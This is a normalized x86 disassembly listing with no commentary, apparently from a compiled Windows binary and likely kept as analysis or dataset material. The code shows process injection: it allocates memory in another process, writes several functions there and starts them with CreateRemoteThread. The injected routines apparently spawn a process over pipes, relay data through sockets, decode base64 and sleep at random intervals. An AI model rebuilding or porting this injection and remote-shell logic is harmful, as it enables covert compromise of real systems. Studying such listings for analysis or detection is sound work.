call [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ ebp + 0x8 ]
push [ esi + 0x3b8 ]
push ebx
push 0x44
lea eax [ ebp - 0x234 ]
pop edi
push edi
push eax
call [ ebp - 0xc ]
lea eax [ ebp - 0x90 ]
push 0x10
push eax
mov [ ebp - 0x234 ] edi
call [ ebp - 0xc ]
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x234 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x334 ]
push ebx
push eax
push ebx
call [ ebp - 0x5c ]
test eax eax
je r-xdata
lea edi [ esi + 0x370 ]
push 0x40
push edi
call [ ebp - 0xc ]
lea eax [ ebp - 0xf0 ]
push eax
push edi
call [ ebp - 0x18 ]
lea eax [ ebp - 0x64 ]
push eax
push ebx
push esi
push [ ebp - 0x44 ]
push ebx
push ebx
call [ ebp - 0x4c ]
push [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
call [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ ebp + 0x8 ]
push [ esi + 0x3bc ]
push [ ebp - 0x24 ]
call [ ebp - 0x28 ]
lea eax [ ebp - 0xf0 ]
push eax
call [ ebp - 0x7c ]
pop ecx
mov edi eax
push [ ebp - 0x4 ]
call [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ ebp + 0x8 ]
push edi
jmp r-xdata
sub eax 0x11
je r-xdata
push [ ebp - 0x90 ]
call [ ebp - 0x28 ]
push [ ebp - 0x8c ]
call [ ebp - 0x28 ]
push esi
call [ ebp - 0x14 ]
push [ ebp - 0x4 ]
call [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ ebp + 0x8 ]
jmp r-xdata
push 0x1
jmp r-xdata
sub eax 0xe
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x4 ]
call [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ ebp + 0x8 ]
push [ esi + 0x3b4 ]
jmp r-xdata
sub_402348
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] edi
push 0x4
push 0x1000
push 0xaca
push edi
push [ ebp + 0x8 ]
mov esi [ VirtualAllocEx@IAT ]
call esi
mov [ ebp - 0x50 ] eax
cmp eax edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x40
push 0x3000
push 0xe000
push edi
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x28 ] eax
cmp eax edi
je r-xdata
call sub_4019c9
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x38 ] eax
lea edi [ eax + 0x2000 ]
mov [ ebp - 0x34 ] edi
lea ebx [ edi + 0x2000 ]
mov [ ebp - 0x30 ] ebx
lea ecx [ ebx + 0x2000 ]
mov [ ebp - 0x48 ] ecx
lea edx [ ecx + 0x2000 ]
mov [ ebp - 0x44 ] edx
lea esi [ edx + 0x2000 ]
mov [ ebp - 0x24 ] esi
add esi 0x1000
mov [ ebp - 0x40 ] esi
add esi 0x1000
mov [ ebp - 0x3c ] esi
mov [ rw-data ] eax
mov [ rw-data ] edi
mov [ rw-data ] ebx
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov eax [ ebp - 0x24 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x40 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
add esi 0x1000
mov [ rw-data ] esi
lea eax [ ebp - 0x1c ]
push eax
push 0xaca
push rw-data
push [ ebp - 0x50 ]
push [ ebp + 0x8 ]
mov esi [ WriteProcessMemory@IAT ]
call esi
test eax eax
je r-xdata
mov esp [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
call sub_40257c
push 0x0
push 0x2000
push sub_401c01
push [ ebp - 0x28 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
push 0x0
push 0x2000
push sub_40264d
push edi
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov edi 0x2000
push edi
push sub_40319e
push ebx
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_403608
push [ ebp - 0x48 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_40364f
push [ ebp - 0x44 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov edi 0x1000
push edi
push sub_402d7d
push [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_402ca0
push [ ebp - 0x40 ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
push sub_402e68
push [ ebp - 0x3c ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
xor eax eax
push eax
push [ ebp - 0x50 ]
push [ ebp - 0x28 ]
push eax
push eax
push [ ebp + 0x8 ]
call [ CreateRemoteThread@IAT ]
mov [ ebp - 0x4c ] eax
sub_40257c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi rw-data
mov [ ebp - 0x24 ] edi
mov esi sub_401c01
mov [ rw-data ] esi
mov [ rw-data ] sub_40264d
mov [ rw-data ] sub_40319e
mov [ rw-data ] sub_403608
mov [ rw-data ] sub_40364f
mov [ rw-data ] sub_402d7d
mov [ rw-data ] sub_402ca0
mov [ rw-data ] sub_402e68
push 0x2000
call malloc
pop ecx
mov [ rw-data ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push edi
push esi
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ ebp - 0x1c ] eax
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
or [ ebp - 0x4 ] 0xffffffff
call sub_402640
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40264d
push ebp
mov ebp esp
sub esp 0xa28
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4e4 ]
push eax
call [ esi + 0x4a8 ]
xor ebx ebx
mov [ ebp - 0x14 ] eax
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ esi + 0x4b4 ]
push eax
call [ esi + 0x4a8 ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x4c ] edi
je r-xdata
lea eax [ esi + 0x4d4 ]
push eax
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ esi + 0x5b4 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x40 ] eax
je r-xdata
lea eax [ esi + 0x620 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x78 ] eax
je r-xdata
lea eax [ esi + 0x81a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x5c ] eax
je r-xdata
lea eax [ esi + 0x610 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x50 ] eax
je r-xdata
lea eax [ esi + 0x9ca ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x28 ] eax
je r-xdata
mov eax [ esi + 0xaba ]
cmp eax ebx
mov [ ebp - 0x2c ] eax
je r-xdata
mov eax [ esi + 0xabe ]
cmp eax ebx
mov [ ebp - 0x6c ] eax
je r-xdata
mov eax [ esi + 0xac6 ]
cmp eax ebx
mov [ ebp - 0x3c ] eax
je r-xdata
lea edi [ esi + 0x752 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
je r-xdata
lea eax [ esi + 0x722 ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x34 ] eax
je r-xdata
lea eax [ esi + 0x72a ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x84 ] eax
je r-xdata
push edi
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x7c ] eax
je r-xdata
lea eax [ esi + 0x76a ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
je r-xdata
lea eax [ esi + 0x77a ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x44 ] eax
je r-xdata
mov edi [ ebp - 0x4c ]
lea eax [ esi + 0x9da ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x80 ] eax
je r-xdata
lea eax [ esi + 0xa1a ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x8c ] eax
je r-xdata
lea eax [ esi + 0x9ea ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
lea eax [ esi + 0x660 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
lea eax [ esi + 0x9c2 ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x30 ] eax
je r-xdata
lea eax [ esi + 0xa4a ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x48 ] eax
je r-xdata
lea eax [ esi + 0xa5a ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x88 ] eax
je r-xdata
lea eax [ esi + 0x82a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x70 ] eax
je r-xdata
lea eax [ esi + 0x58c ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x1c ] eax
je r-xdata
lea eax [ esi + 0x5d8 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x74 ] eax
je r-xdata
push 0x4a
xor eax eax
pop ecx
lea edi [ ebp - 0x31b ]
mov [ ebp - 0x31c ] bl
mov [ ebp - 0xa28 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0xa27 ]
mov [ ebp - 0x68 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x67 ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
mov edi [ esi + 0x514 ]
mov [ ebp - 0x4 ] ebx
cmp edi ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x58 ] 0x6
mov [ ebp - 0x54 ] ebx
je r-xdata
mov [ ebp - 0x98 ] 0xc
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] 0x1
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0xdc ]
mov [ ebp - 0xdc ] 0x44
push eax
call [ ebp - 0x50 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0xac ] bx
mov [ ebp - 0x9c ] eax
mov [ ebp - 0xa0 ] eax
lea eax [ esi + 0xa9a ]
mov [ ebp - 0xb0 ] 0x101
push eax
lea eax [ ebp - 0x31c ]
push eax
call [ ebp - 0x18 ]
push 0x1000
push edi
call [ ebp - 0x8 ]
lea eax [ ebp - 0x420 ]
push eax
push edi
call [ ebp - 0x18 ]
push edi
call [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
push eax
mov al [ esi + 0x15 ]
push eax
push edi
call [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1f0 ] 0x1
mov [ ebp - 0x1ec ] eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x1f0 ]
push ebx
push eax
push ebx
push ebx
call [ ebp - 0x24 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x4 ]
call [ ebp - 0x1c ]
call [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp - 0x1f0 ]
push eax
push [ ebp + 0xc ]
call [ ebp - 0x20 ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
add esi 0x4b0
call [ esi ]
push [ ebp - 0x4c ]
call [ esi ]
push [ ebp - 0x14 ]
call [ esi ]
push [ ebp - 0xc ]
call [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
push 0x1000
push edi
mov [ ebp - 0x520 ] eax
mov [ ebp - 0x524 ] 0x1
call [ ebp - 0x8 ]
push ebx
push ebx
lea eax [ ebp - 0x524 ]
push ebx
push eax
push ebx
call [ ebp - 0x24 ]
cmp eax 0xffffffff
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x68 ]
push 0xa
push eax
push [ ebp - 0x10 ]
call [ ebp - 0x30 ]
add esp 0xc
push eax
push [ ebp + 0xc ]
call [ ebp - 0x34 ]
push [ ebp - 0x10 ]
push edi
push [ ebp + 0xc ]
push esi
call [ ebp - 0x3c ]
lea eax [ ebp - 0x524 ]
push eax
push [ ebp + 0xc ]
call [ ebp - 0x20 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x98 ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x38 ] ebx
call [ ebp - 0x5c ]
test eax eax
je r-xdata
push ebx
push 0xfff
push edi
push [ ebp + 0xc ]
call [ ebp - 0x84 ]
cmp eax 0xffffffff
je r-xdata
push [ ebp + 0xc ]
call [ ebp - 0x7c ]
push eax
mov al [ esi + 0x15 ]
push eax
push edi
call [ ebp - 0x6c ]
lea eax [ esi + 0x3c0 ]
push 0x4
push eax
push edi
call [ ebp - 0x48 ]
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x3c8 ]
push 0x2
push eax
push edi
call [ ebp - 0x48 ]
add esp 0xc
test eax eax
jne r-xdata
push edi
call [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x31c ]
push edi
push eax
call [ ebp - 0x88 ]
add esp 0xc
lea eax [ ebp - 0xec ]
push eax
lea eax [ ebp - 0xdc ]
push eax
push ebx
push ebx
push 0x10
push 0x1
push ebx
lea eax [ ebp - 0x31c ]
push ebx
push eax
push ebx
call [ ebp - 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x3c8 ]
push eax
push edi
call [ ebp - 0x8c ]
pop ecx
add eax 0x3
pop ecx
push eax
lea eax [ ebp - 0x628 ]
push eax
call [ ebp - 0x80 ]
lea eax [ ebp - 0x628 ]
push eax
call [ ebp - 0x78 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x31c ]
push 0x12c
push eax
call [ ebp - 0x8 ]
push [ ebp - 0xc ]
call [ ebp - 0x1c ]
lea eax [ ebp - 0x420 ]
push eax
push 0x104
call [ ebp - 0x40 ]
lea eax [ esi + 0x3cc ]
push eax
lea eax [ ebp - 0x420 ]
push eax
call [ ebp - 0x18 ]
push [ ebp - 0x4 ]
call [ ebp - 0x1c ]
jmp r-xdata
push 0x1000
push edi
call [ ebp - 0x8 ]
lea eax [ ebp - 0xa28 ]
push eax
push edi
call [ ebp - 0x18 ]
push edi
call [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
push eax
mov al [ esi + 0x15 ]
push eax
push edi
call [ ebp - 0x2c ]
lea eax [ ebp - 0x68 ]
push 0xa
push eax
push [ ebp - 0x10 ]
call [ ebp - 0x30 ]
mov eax [ ebp + 0xc ]
add esp 0xc
mov [ ebp - 0x1ec ] eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x1f0 ]
push ebx
push eax
push ebx
push ebx
mov [ ebp - 0x1f0 ] 0x1
call [ ebp - 0x24 ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x1f0 ]
push eax
push [ ebp + 0xc ]
call [ ebp - 0x20 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa28 ]
push 0x400
push eax
call [ ebp - 0x8 ]
lea eax [ ebp - 0x38 ]
push ebx
push eax
lea eax [ ebp - 0xa28 ]
push 0x3ff
push eax
push [ ebp - 0x4 ]
call [ ebp - 0x74 ]
cmp [ ebp - 0x38 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0x68 ]
push 0x4
push eax
push [ ebp + 0xc ]
call [ ebp - 0x34 ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x10 ]
push edi
push [ ebp + 0xc ]
push esi
call [ ebp - 0x3c ]
jmp r-xdata
sub_402ca0
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4d4 ]
push eax
call [ esi + 0x4a8 ]
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ esi + 0x722 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
lea eax [ esi + 0x76a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
lea eax [ esi + 0x752 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x10 ] ebx
cmp edi ebx
mov [ ebp - 0xc ] 0x493e0
jle r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
cmp edi ebx
jg r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
push esi
call [ ebp - 0x4 ]
cmp eax ebx
jl r-xdata
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x110 ] esi
push eax
lea eax [ ebp - 0x114 ]
push ebx
push eax
push ebx
push ebx
mov [ ebp - 0x114 ] 0x1
call [ ebp + 0x8 ]
lea eax [ ebp - 0x114 ]
push eax
push esi
call [ ebp - 0x8 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
jmp r-xdata
add [ ebp + 0x10 ] eax
sub edi eax
sub_402d7d
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4b4 ]
lea edi [ esi + 0x4a8 ]
push eax
call [ edi ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
lea eax [ esi + 0x4e4 ]
push eax
call [ edi ]
mov edi eax
test edi edi
mov [ ebp - 0x10 ] edi
je r-xdata
lea eax [ esi + 0x992 ]
push eax
push edi
call [ esi + 0x4ac ]
test eax eax
mov [ ebp - 0xc ] eax
je r-xdata
lea eax [ esi + 0x98a ]
push eax
push edi
call [ esi + 0x4ac ]
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea eax [ esi + 0x99a ]
push eax
push edi
call [ esi + 0x4ac ]
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esi + 0x59c ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x4ac ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
lea edi [ eax + eax * 4 ]
shl edi 0x1
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x3c
pop edi
imul edi edi 0xea60
push edi
push 0x0
call [ ebp - 0x8 ]
push eax
call [ ebp - 0xc ]
pop ecx
pop ecx
call ebx
xor edx edx
div edi
cmp edx 0x5
ja r-xdata
imul edx edx 0xea60
push edx
jmp r-xdata
push 0x3
pop edx
call [ ebp + 0x8 ]
push [ ebp - 0x10 ]
add esi 0x4b0
call [ esi ]
push [ ebp - 0x4 ]
call [ esi ]
sub_402e68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4e4 ]
push eax
call [ esi + 0x4a8 ]
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
lea eax [ esi + 0x4b4 ]
push eax
call [ esi + 0x4a8 ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esi + 0x9fa ]
push eax
push edi
call [ esi + 0x4ac ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
lea eax [ esi + 0xa1a ]
push eax
push ebx
call [ esi + 0x4ac ]
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esi + 0x9ca ]
push eax
push edi
call [ esi + 0x4ac ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ esi + 0x30 ]
push eax
push [ ebp + 0xc ]
call ebx
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
lea eax [ esi + 0x38 ]
push eax
push [ ebp + 0xc ]
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
sub eax edi
add edi 0x5
sub eax 0x4
lea ebx [ esi + 0x2f0 ]
push eax
push edi
push ebx
call [ ebp - 0x4 ]
push ebx
lea edi [ esi + 0x330 ]
call [ ebp + 0x8 ]
push eax
push ebx
push edi
call sub_402f5e
add esp 0xc
cmp [ edi ] 0x75
jne r-xdata
cmp [ esi + 0x331 ] 0x67
jne r-xdata
push edi
call [ ebp + 0x8 ]
dec eax
add esi 0x332
push eax
push esi
push [ ebp + 0x10 ]
call [ ebp - 0x4 ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_402f5e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test eax eax
push edi
jne r-xdata
and [ ebp + 0xc ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
test ecx ecx
mov [ ebp - 0x8 ] esi
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xc ] eax
jge r-xdata
lea eax [ ecx + 0x3 ]
shr eax 0x2
mov [ ebp - 0x10 ] eax
lea ecx [ eax + eax * 2 ]
shl eax 0x2
mov [ ebp + 0xc ] ecx
mov [ ebp - 0xc ] eax
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub eax [ ebp - 0xc ]
xor esi esi
mov [ ebp + 0x10 ] esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
mov [ ebp + 0x8 ] edi
shr [ ebp + 0x8 ] 0x8
push [ ebp + 0x8 ]
call sub_403152
mov esi eax
push edi
and esi 0xff0
shl esi 0x2
sar esi 0x6
call sub_403152
mov [ ebp - 0x4 ] edi
and eax 0x3f
shr [ ebp - 0x4 ] 0x10
push [ ebp - 0x4 ]
shl eax 0x2
or esi eax
call sub_403152
push [ ebp + 0x8 ]
and eax 0x3fc
shl eax 0x2
sar eax 0x4
mov [ ebp - 0x14 ] eax
call sub_403152
mov ecx [ ebp - 0x14 ]
and eax 0xf
shl eax 0x4
shr edi 0x18
or ecx eax
push edi
mov [ ebp + 0x8 ] ecx
call sub_403152
push [ ebp - 0x4 ]
mov edi eax
and edi 0xff
shl edi 0x2
sar edi 0x2
call sub_403152
and eax 0x3
add [ ebp - 0x8 ] 0x4
shl eax 0x6
or edi eax
add esp 0x18
shl edi 0x8
or edi [ ebp + 0x8 ]
shl edi 0x8
or edi esi
mov [ ebx ] edi
add ebx 0x3
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] esi
shr [ ebp + 0x10 ] 0x8
push [ ebp + 0x10 ]
call sub_403152
mov edx eax
push esi
shl edx 0x2
sar edx 0x6
mov [ ebp + 0x8 ] edx
call sub_403152
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
shl al 0x2
or cl al
mov eax esi
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
and eax 0xff00
cmp eax 0x3d00
je r-xdata
mov esi [ ebp - 0x8 ]
mov ecx eax
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff000000
cmp eax 0x3d000000
je r-xdata
mov eax esi
shr eax 0x10
push eax
call sub_403152
push [ ebp + 0x10 ]
mov edx eax
shl edx 0x2
sar edx 0x4
mov [ ebp + 0x10 ] edx
call sub_403152
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x4
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
mov eax esi
shr eax 0x18
push eax
call sub_403152
mov edx eax
shl edx 0x2
shr esi 0x10
sar edx 0x2
push esi
mov [ ebp + 0x10 ] edx
call sub_403152
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x6
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
sub_403152
mov cl [ esp + 0x4 ]
or eax 0xffffffff
cmp cl 0x41
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x5a
jg r-xdata
cmp cl 0x30
jl r-xdata
cmp cl 0x7a
jg r-xdata
movsx eax cl
sub eax 0x41
retn
cmp cl 0x2b
jne r-xdata
cmp cl 0x39
jg r-xdata
movsx eax cl
sub eax 0x47
retn
cmp cl 0x2f
jne r-xdata
push 0x3e
pop eax
retn
movsx eax cl
add eax 0x4
retn
retn
push 0x3f
pop eax
sub_40319e
push ebp
mov ebp esp
sub esp 0x3ac
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4d4 ]
push eax
call [ esi + 0x4a8 ]
mov edi eax
xor ebx ebx
cmp edi ebx
mov [ ebp - 0x48 ] edi
je r-xdata
xor eax eax
lea eax [ esi + 0x4e4 ]
push eax
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ esi + 0x4b4 ]
push eax
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
lea eax [ esi + 0xa2a ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x50 ] eax
je r-xdata
lea eax [ esi + 0x9ca ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
je r-xdata
lea eax [ esi + 0x6ca ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x5c ] eax
je r-xdata
lea eax [ esi + 0x9ba ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
lea eax [ esi + 0xa4a ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x30 ] eax
je r-xdata
lea eax [ esi + 0x564 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x2c ] eax
je r-xdata
lea eax [ esi + 0x6da ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x60 ] eax
je r-xdata
lea eax [ esi + 0x732 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
lea eax [ esi + 0x70a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x34 ] eax
je r-xdata
lea eax [ esi + 0x6ea ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
lea eax [ esi + 0x71a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x58 ] eax
je r-xdata
lea eax [ esi + 0x742 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x1c ] eax
je r-xdata
lea eax [ esi + 0x722 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x44 ] eax
je r-xdata
lea eax [ esi + 0x752 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x4c ] eax
je r-xdata
lea eax [ esi + 0x72a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x28 ] eax
je r-xdata
lea eax [ esi + 0x76a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
jne r-xdata
lea eax [ esi + 0x75a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x40 ] eax
je r-xdata
